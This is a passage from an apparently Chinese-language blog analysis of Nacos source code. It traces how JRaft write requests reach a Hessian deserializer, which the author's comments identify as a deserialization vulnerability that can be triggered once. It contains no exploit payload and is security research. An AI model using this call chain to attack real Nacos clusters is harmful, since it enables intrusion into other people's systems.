com.caucho.hessian.io.SerializerFactory;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianSerializer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializer</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hessian&quot;</span>;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">SerializerFactory</span> <span class="hljs-variable">serializerFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SerializerFactory</span>();<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HessianSerializer</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> &#123;<br>        <span class="hljs-keyword">return</span> deseiralize0(data);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data, Class&lt;T&gt; cls)</span> &#123;<br>        <span class="hljs-keyword">return</span> deserialize(data);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; T <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data, Type type)</span> &#123;<br>        <span class="hljs-keyword">return</span> deserialize(data);<br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> &lt;T&gt; T <span class="hljs-title function_">deseiralize0</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] data)</span> &#123;<br>        <span class="hljs-keyword">if</span> (ByteUtils.isEmpty(data)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    <br>        <span class="hljs-type">Hessian2Input</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data));<br>        input.setSerializerFactory(serializerFactory);<br>        Object resultObject;<br>        <span class="hljs-keyword">try</span> &#123;<br>            resultObject = input.readObject();<br>            input.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;IOException occurred when Hessian serializer decode!&quot;</span>, e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> (T) resultObject;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> &lt;T&gt; <span class="hljs-type">byte</span>[] serialize(T obj) &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">Hessian2Output</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Output</span>(byteArray);<br>        output.setSerializerFactory(serializerFactory);<br>        <span class="hljs-keyword">try</span> &#123;<br>            output.writeObject(obj);<br>            output.close();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;IOException occurred when Hessian serializer encode!&quot;</span>, e);<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> byteArray.toByteArray();<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">name</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> NAME;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="JRaftServer"><a href="#JRaftServer" class="headerlink" title="JRaftServer"></a>JRaftServer</h3><p>com.alibaba.nacos.core.distributed.raft.JRaftServer#start() 启动RaftServer</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (!isStarted) &#123;<br>        Loggers.RAFT.info(<span class="hljs-string">&quot;========= The raft protocol is starting... =========&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// init raft group node</span><br>            com.alipay.sofa.jraft.<span class="hljs-type">NodeManager</span> <span class="hljs-variable">raftNodeManager</span> <span class="hljs-operator">=</span> com.alipay.sofa.jraft.NodeManager.getInstance();<br>            <span class="hljs-keyword">for</span> (String address : raftConfig.getMembers()) &#123;<br>                <span class="hljs-type">PeerId</span> <span class="hljs-variable">peerId</span> <span class="hljs-operator">=</span> PeerId.parsePeer(address);<br>                conf.addPeer(peerId);<br>                raftNodeManager.addAddress(peerId.getEndpoint());<br>            &#125;<br>            nodeOptions.setInitialConf(conf);<br>            <span class="hljs-comment">//调用至JRaftUtils#initRpcServer()</span><br>            rpcServer = JRaftUtils.initRpcServer(<span class="hljs-built_in">this</span>, localPeerId);<br>            <br>            <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.rpcServer.init(<span class="hljs-literal">null</span>)) &#123;<br>                Loggers.RAFT.error(<span class="hljs-string">&quot;Fail to init [BaseRpcServer].&quot;</span>);<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;Fail to init [BaseRpcServer].&quot;</span>);<br>            &#125;<br>            <br>            <span class="hljs-comment">// Initialize multi raft group service framework</span><br>            isStarted = <span class="hljs-literal">true</span>;<br>            createMultiRaftGroup(processors);<br>            Loggers.RAFT.info(<span class="hljs-string">&quot;========= The raft protocol start finished... =========&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Loggers.RAFT.error(<span class="hljs-string">&quot;raft protocol start failure, cause: &quot;</span>, e);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRaftException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>JRaftUtils#initRpcServer()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> RpcServer <span class="hljs-title function_">initRpcServer</span><span class="hljs-params">(JRaftServer server, PeerId peerId)</span> &#123;<br><br>	...<br>    <span class="hljs-comment">//注册自定义 Rpc 请求处理器</span><br>    rpcServer.registerProcessor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NacosWriteRequestProcessor</span>(server, SerializeFactory.getDefault()));<br>    rpcServer.registerProcessor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NacosReadRequestProcessor</span>(server, SerializeFactory.getDefault()));<br>    <br>    <span class="hljs-keyword">return</span> rpcServer;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="RpcProcessor"><a href="#RpcProcessor" class="headerlink" title="RpcProcessor"></a>RpcProcessor</h3><p>Rpc 请求处理器，只有当业务通讯也使用sofa-jraft提供的RpcServer才需要。可以实现com.alipay.sofa.jraft.rpc.RpcProcessor接口，根据目标请求参数，处理业务请求。<br>可看出 Nacos 使用的 RpcProcessor 为NacosWriteRequestProcessor 和 NacosReadRequestProcessor<br>NacosWriteRequestProcessor</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NacosWriteRequestProcessor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractProcessor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RpcProcessor</span>&lt;WriteRequest&gt; &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">INTEREST_NAME</span> <span class="hljs-operator">=</span> WriteRequest.class.getName();<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> JRaftServer server;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">NacosWriteRequestProcessor</span><span class="hljs-params">(JRaftServer server, Serializer serializer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(serializer);<br>        <span class="hljs-built_in">this</span>.server = server;<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleRequest</span><span class="hljs-params">(RpcContext rpcCtx, WriteRequest request)</span> &#123;<br>        <span class="hljs-comment">//调用至父类即 AbstractProcessor#handleRequest()方法</span><br>        handleRequest(server, request.getGroup(), rpcCtx, request);<br>    &#125;<br>    <br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">interest</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> INTEREST_NAME;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>NacosWriteRequestProcessor 继承 AbstractProcessor</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AbstractProcessor</span> &#123;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Serializer serializer;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">AbstractProcessor</span><span class="hljs-params">(Serializer serializer)</span> &#123;<br>        <span class="hljs-built_in">this</span>.serializer = serializer;<br>    &#125;<br>    <br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleRequest</span><span class="hljs-params">(<span class="hljs-keyword">final</span> JRaftServer server, <span class="hljs-keyword">final</span> String group, <span class="hljs-keyword">final</span> RpcContext rpcCtx, Message message)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> JRaftServer.<span class="hljs-type">RaftGroupTuple</span> <span class="hljs-variable">tuple</span> <span class="hljs-operator">=</span> server.findTupleByGroup(group);<br>            <span class="hljs-keyword">if</span> (Objects.isNull(tuple)) &#123;<br>                rpcCtx.sendResponse(Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>)<br>                        .setErrMsg(<span class="hljs-string">&quot;Could not find the corresponding Raft Group : &quot;</span> + group).build());<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">//判断是否为 Leader</span><br>            <span class="hljs-keyword">if</span> (tuple.getNode().isLeader()) &#123;<br>                <span class="hljs-comment">//此处后续调用至自定义状态机</span><br>                execute(server, rpcCtx, message, tuple);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                rpcCtx.sendResponse(<br>                        Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(<span class="hljs-string">&quot;Could not find leader : &quot;</span> + group).build());<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>            Loggers.RAFT.error(<span class="hljs-string">&quot;handleRequest has error : &quot;</span>, e);<br>            rpcCtx.sendResponse(Response.newBuilder().setSuccess(<span class="hljs-literal">false</span>).setErrMsg(e.toString()).build());<br>        &#125;<br>    &#125;<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>com.alipay.sofa.jraft.core.#isLeader() 此处获取State.STATE_LEADER</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLeader</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> isLeader(<span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLeader</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> blocking)</span> &#123;<br>    <span class="hljs-keyword">if</span> (!blocking) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.state == State.STATE_LEADER;<br>    &#125;<br>    <span class="hljs-built_in">this</span>.readLock.lock();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.state == State.STATE_LEADER;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-built_in">this</span>.readLock.unlock();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="状态机"><a href="#状态机" class="headerlink" title="状态机"></a>状态机</h3><p>使用sofa-jraft需要实现自己的StateMachine，Nacos使用得状态机为 NacosStateMachine<br>最重要的方法是onApply方法。当Node提交Task，对应的log被提交到Raft集群后，当quorum节点成功commit log，触发这个方法来应用状态（当前节点存储数据）。CounterStateMachine在onApply方法中，执行原子计数器的相关功能，包括get和addAndGet。<br>com.alibaba.nacos.core.distributed.raft.JRaftServer#createMultiRaftGroup() 启动RaftServer</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createMultiRaftGroup</span><span class="hljs-params">(Collection&lt;RequestProcessor4CP&gt; processors)</span> &#123;<br>    <span class="hljs-comment">// There is no reason why the LogProcessor cannot be processed because of the synchronization</span><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.isStarted) &#123;<br>        <span class="hljs-built_in">this</span>.processors.addAll(processors);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">parentPath</span> <span class="hljs-operator">=</span> Paths.get(EnvUtil.getNacosHome(), <span class="hljs-string">&quot;data/protocol/raft&quot;</span>).toString();<br>    <br>    <span class="hljs-keyword">for</span> (RequestProcessor4CP processor : processors) &#123;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">groupName</span> <span class="hljs-operator">=</span> processor.group();<br>        <span class="hljs-keyword">if</span> (multiRaftGroup.containsKey(groupName)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DuplicateRaftGroupException</span>(groupName);<br>        &#125;<br>        <br>        <span class="hljs-comment">//确保每个Raft Group都有自己的配置和NodeOptions</span><br>        <span class="hljs-type">Configuration</span> <span class="hljs-variable">configuration</span> <span class="hljs-operator">=</span> conf.copy();<br>        <span class="hljs-type">NodeOptions</span> <span class="hljs-variable">copy</span> <span class="hljs-operator">=</span> nodeOptions.copy();<br>        JRaftUtils.initDirectory(parentPath, groupName, copy);<br>        <br>        <span class="hljs-comment">// Here, the LogProcessor is passed into StateMachine, and when the StateMachine</span><br>        <span class="hljs-comment">// triggers onApply, the onApply of the LogProcessor is actually called</span><br>        <span class="hljs-comment">//processors 传递给StateMachine，当StateMachine</span><br>		<span class="hljs-comment">//触发onApply，实际调用 processors的onApply()</span><br>        <span class="hljs-type">NacosStateMachine</span> <span class="hljs-variable">machine</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NacosStateMachine</span>(<span class="hljs-built_in">this</span>, processor);<br>        <br>        copy.setFsm(machine);<br>        copy.setInitialConf(configuration);<br>            <br>        <span class="hljs-comment">// Set snapshot interval, default 1800 seconds</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">doSnapshotInterval</span> <span class="hljs-operator">=</span> ConvertUtils.toInt(raftConfig.getVal(RaftSysConstants.RAFT_SNAPSHOT_INTERVAL_SECS),<br>                RaftSysConstants.DEFAULT_RAFT_SNAPSHOT_INTERVAL_SECS);<br>        <br>        <span class="hljs-comment">// If the business module does not implement a snapshot processor, cancel the snapshot</span><br>        doSnapshotInterval = CollectionUtils.isEmpty(processor.loadSnapshotOperate()) ? <span class="hljs-number">0</span> : doSnapshotInterval;<br>        <br>        copy.setSnapshotIntervalSecs(doSnapshotInterval);<br>        Loggers.RAFT.info(<span class="hljs-string">&quot;create raft group : &#123;&#125;&quot;</span>, groupName);<br>        <span class="hljs-type">RaftGroupService</span> <span class="hljs-variable">raftGroupService</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RaftGroupService</span>(groupName, localPeerId, copy, rpcServer, <span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">//启动</span><br>        <span class="hljs-comment">// Because BaseRpcServer has been started before, it is not allowed to start again here</span><br>        <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> raftGroupService.start(<span class="hljs-literal">false</span>);<br>        machine.setNode(node);<br>        RouteTable.getInstance().updateConfiguration(groupName, configuration);<br>        <br>        RaftExecutor.executeByCommon(() -&gt; registerSelfToCluster(groupName, localPeerId, configuration));<br>        <br>        <span class="hljs-comment">// Turn on the leader auto refresh for this group</span><br>        <span class="hljs-type">Random</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>();<br>        <span class="hljs-type">long</span> <span class="hljs-variable">period</span> <span class="hljs-operator">=</span> nodeOptions.getElectionTimeoutMs() + random.nextInt(<span class="hljs-number">5</span> * <span class="hljs-number">1000</span>);<br>        RaftExecutor.scheduleRaftMemberRefreshJob(() -&gt; refreshRouteTable(groupName),<br>                nodeOptions.getElectionTimeoutMs(), period, TimeUnit.MILLISECONDS);<br>        multiRaftGroup.put(groupName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RaftGroupTuple</span>(node, processor, raftGroupService, machine));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>JRaftServer#createMultiRaftGroup()  传入参数类为 RequestProcessor4CP，此类存在5个实现类，其中以下三个为<code>@Component</code>为注解注释类</p>
+<ul>
+<li>com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl</li>
+<li>com.alibaba.nacos.naming.core.v2.metadata.InstanceMetadataProcessor</li>
+<li>com.alibaba.nacos.naming.core.v2.metadata.ServiceMetadataProcessor</li>
+</ul>
+<p>以上三个类构造方法中均调用 JRaftProtocol#addRequestProcessors() 方法，最终调用至JRaftServer#createMultiRaftGroup()，故调用顺序为 NacosStateMachine#onApply() 后调用至以上三个类的 onApply() 方法。<br>NacosStateMachine#onApply()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onApply</span><span class="hljs-params">(Iterator iter)</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">applied</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    Message message;<br>    <span class="hljs-type">NacosClosure</span> <span class="hljs-variable">closure</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">while</span> (iter.hasNext()) &#123;<br>            <span class="hljs-type">Status</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> Status.OK();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (iter.done() != <span class="hljs-literal">null</span>) &#123;<br>                    closure = (NacosClosure) iter.done();<br>                    message = closure.getMessage();<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">final</span> <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> iter.getData();<br>                    message = ProtoMessageUtil.parse(data.array());<br>                    <span class="hljs-keyword">if</span> (message <span class="hljs-keyword">instanceof</span> ReadRequest) &#123;<br>                        <span class="hljs-comment">//&#x27;iter.done() == null&#x27; means current node is follower, ignore read operation</span><br>                        applied++;<br>                        index++;<br>                        iter.next();<br>                        <span class="hljs-keyword">continue</span>;<br>                    &#125;<br>                &#125;<br>                <br>                LoggerUtils.printIfDebugEnabled(Loggers.RAFT, <span class="hljs-string">&quot;receive log : &#123;&#125;&quot;</span>, message);<br><br>                <span class="hljs-comment">//判断类型是否为 WriteRequest 是则进入if</span><br>                <span class="hljs-keyword">if</span> (message <span class="hljs-keyword">instanceof</span> WriteRequest) &#123;<br>                    <span class="hljs-comment">//调用上面三个实现类的 onApply() 方法</span><br>                    <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> processor.onApply((WriteRequest) message);<br>                    postProcessor(response, closure);<br>                &#125;<br>                <br>                <span class="hljs-keyword">if</span> (message <span class="hljs-keyword">instanceof</span> ReadRequest) &#123;<br>                    <span class="hljs-type">Response</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> processor.onRequest((ReadRequest) message);<br>                    postProcessor(response, closure);<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (Throwable e) &#123;<br>                index++;<br>                status.setError(RaftError.UNKNOWN, e.toString());<br>                Optional.ofNullable(closure).ifPresent(closure1 -&gt; closure1.setThrowable(e));<br>                <span class="hljs-keyword">throw</span> e;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                Optional.ofNullable(closure).ifPresent(closure1 -&gt; closure1.run(status));<br>			&#125;<br>            applied++;<br>            index++;<br>            iter.next();<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable t) &#123;<br>            Loggers.RAFT.error(<span class="hljs-string">&quot;processor : &#123;&#125;, stateMachine meet critical error: &#123;&#125;.&quot;</span>, processor, t);<br>            <span class="hljs-comment">//若 processor#onApply() 则设置 State 为State.STATE_ERROR</span><br>        	iter.setErrorAndRollback(index - applied,<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">Status</span>(RaftError.ESTATEMACHINE, <span class="hljs-string">&quot;StateMachine meet critical error: %s.&quot;</span>,<br>                            ExceptionUtil.getStackTrace(t)));<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p> com.alibaba.nacos.naming.core.v2.service.impl.PersistentClientOperationServiceImpl#onApply()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Response <span class="hljs-title function_">onApply</span><span class="hljs-params">(WriteRequest request)</span> &#123;<br>	<span class="hljs-comment">//此处调用至 HessianSerializer#deserialize() 方法，存在Hessian反序列化漏洞</span><br>	<span class="hljs-comment">//此处接收类为 InstanceStoreRequest，若反序列化类不为 InstanceStoreRequest 则报错，导致服务异常</span><br>	<span class="hljs-comment">//State为State.STATE_ERROR 导致AbstractProcessor#handleRequest() 不继续执行至 execute() 此漏洞无法再次利用</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-type">InstanceStoreRequest</span> <span class="hljs-variable">instanceRequest</span> <span class="hljs-operator">=</span> serializer.deserialize(request.getData().toByteArray());<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">DataOperation</span> <span class="hljs-variable">operation</span> <span class="hljs-operator">=</span> DataOperation.valueOf(request.getOperation());<br>    <span 